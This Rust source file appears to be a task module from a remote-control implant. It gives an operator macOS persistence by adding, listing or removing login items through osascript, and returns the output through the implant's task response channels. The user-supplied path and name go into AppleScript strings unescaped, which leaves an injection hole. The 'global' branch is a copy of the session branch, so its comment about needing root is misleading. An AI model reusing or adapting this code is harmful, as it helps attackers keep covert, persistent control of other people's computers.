use crate::structs::Task;
use serde::Deserialize;
use tokio::process::Command;

#[derive(Deserialize)]
struct PersistLoginItemArgs {
    #[serde(default)]
    path: String,
    #[serde(default)]
    name: String,
    #[serde(default)]
    global: bool,
    #[serde(default)]
    list: bool,
    #[serde(default)]
    remove: bool,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: PersistLoginItemArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let result = if args.list {
        // List login items via osascript
        let script =
            "tell application \"System Events\" to get the name of every login item";
        Command::new("osascript")
            .args(["-e", script])
            .output()
            .await
    } else if args.remove {
        // Remove login item
        let script = format!(
            "tell application \"System Events\" to delete login item \"{}\"",
            args.name
        );
        Command::new("osascript")
            .args(["-e", &script])
            .output()
            .await
    } else if args.global {
        // Add global login item using shared file list (requires root)
        let script = format!(
            "tell application \"System Events\" to make login item at end with properties {{path:\"{}\", name:\"{}\", hidden:false}}",
            args.path, args.name
        );
        Command::new("osascript")
            .args(["-e", &script])
            .output()
            .await
    } else {
        // Add session login item
        let script = format!(
            "tell application \"System Events\" to make login item at end with properties {{path:\"{}\", name:\"{}\", hidden:false}}",
            args.path, args.name
        );
        Command::new("osascript")
            .args(["-e", &script])
            .output()
            .await
    };

    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            response.user_output = format!("{}{}", stdout, stderr);
            response.completed = true;
        }
        Err(e) => {
            response.set_error(&format!("Failed: {}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
